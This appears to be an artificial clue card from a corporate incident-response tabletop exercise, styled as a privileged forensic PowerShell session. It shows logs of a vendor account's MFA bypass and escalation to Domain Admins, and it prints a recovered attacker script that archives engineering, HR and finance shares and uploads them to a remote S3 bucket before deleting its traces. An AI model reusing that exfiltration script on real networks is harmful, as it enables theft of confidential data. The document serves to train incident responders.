fields.windowTitle: Administrator: Windows PowerShell — BWC-FWS-11 — Case ICM-0325 (PRIVILEGED & CONFIDENTIAL)

commands.cmd: # PRIVILEGED & CONFIDENTIAL. Attorney-client communication / attorney work product. Prepared by Blackwater Cyber at the direction of Harrow Fenn LLP. Case ICM-0325, Thu 2027-03-25 21:00 CT. For the CISO and General Counsel, Ironcrest Machinery Corporation, only.

commands.output:
gateway_auth_20270322.log:4471:2027-03-22 23:14:31 CT LOGON FAILURE user=svc_wmsvendor src=203.0.113.87 proto=RDP-GW MFA=required reason=mfa_not_completed
gateway_auth_20270322.log:4472:2027-03-22 23:14:52 CT LOGON SUCCESS user=svc_wmsvendor src=203.0.113.87 MFA=bypass(legacy-protocol) proto=NTLM-basic
gateway_auth_20270322.log:4473:2027-03-22 23:14:58 CT SESSION OPEN user=svc_wmsvendor src=203.0.113.87 -> RDP ICM-FS-04:3389
gateway_auth_20270322.log:4519:2027-03-23 02:41:16 CT SESSION CLOSE user=svc_wmsvendor src=203.0.113.87 duration=03:26:18

commands.cmd: Get-WinEvent -Path .\Evidence\DC\Security_export_20270325.evtx -FilterXPath "*[System[EventID=4728]]" | Where-Object { $_.Message -match 'svc_wmsvendor' } | Format-List TimeCreated, Id, Message
commands.output:
TimeCreated : 3/22/2027 11:31:07 PM
Id : 4728
Message : A member was added to a security-enabled global group.
 Subject:
 Account Name: svc_wmsvendor
 Account Domain: IRONCREST
 Member:
 Account Name: IRONCREST\svc_wmsvendor
 Group:
 Group Name: Domain Admins
 Group Domain: IRONCREST

# svc update helper
$src = @('\\ICM-FS-04\Engineering\Released',
 '\\ICM-FS-03\HR\Exports',
 '\\ICM-FS-03\Finance\Close')
$stage = 'C:\ProgramData\svcupd\tmp'
foreach ($s in $src) {
 $tag = ($s -split '\\')[-2..-1] -join '_'
 Get-ChildItem $s -Recurse -File | Select-Object -Expand FullName | Out-File "$stage\$tag.lst"
 & 'C:\Program Files\7-Zip\7z.exe' a -v2g -mhe=on -p"$env:SVCK" "$stage\$tag.7z" "@$stage\$tag.lst"
 & 'C:\ProgramData\svcupd\rcl.exe' copy $stage s3remote:bkt-7731/$tag --transfers 16
 Remove-Item "$stage\$tag*" -Force
}

commands.cmd: Import-Csv .\Evidence\ICM-FS-04\rcl_transfer_reconstructed.csv | Group-Object Share | Select-Object Name, @{n='First (CT)';e={($_.Group.Start | Sort-Object)[0]}}, @{n='Last (CT)';e={($_.Group.End | Sort-Object)[-1]}}, @{n='GB';e={[math]::Round(($_.Group | Measure-Object Bytes -Sum).Sum/1GB,0)}} | Format-Table -AutoSize

commands.output:
CONFIRMED
 - Abuse of svc_wmsvendor, the Joliet warehouse software vendor's support account, from 203.0.113.87 via legacy-protocol MFA bypass, 2027-03-22 23:14:52 CT. Vendor states no technician was working that night.
 - Domain-admin compromise: svc_wmsvendor added to Domain Admins 23:31:07 CT.
 - Exfiltration of about 1.2 TB (1.19 TB) from Engineering Released (742 GB), HR Exports (198 GB) and Finance Close (251 GB), 22-24 March. Finance Close is a category not in our 18:55 update. Total matches the attackers' 1.2 TB claim.
UNKNOWN
 - Which drawings and how many personnel records were taken; which close files.
 - Whether the attackers still hold valid credentials.
RECOMMENDATION
 - Disable svc_wmsvendor and all vendor remote-access accounts on ICM-RA-01 now.
 - Reset krbtgt twice, with replication between resets, before any rebuild.
 - Lead examiner, Blackwater Cyber

instructorNote: This clue shows that identity is compromised and that a third data category, Finance close, was taken. Watch whether the CISO disables vendor access, puts the identity rebuild first and does not contact the attackers, sends indicators only through the GC's FBI channel, and tells the GC within the hour. Also watch whether the GC reopens the 19:00 determination and records the update for the Disclosure Committee.
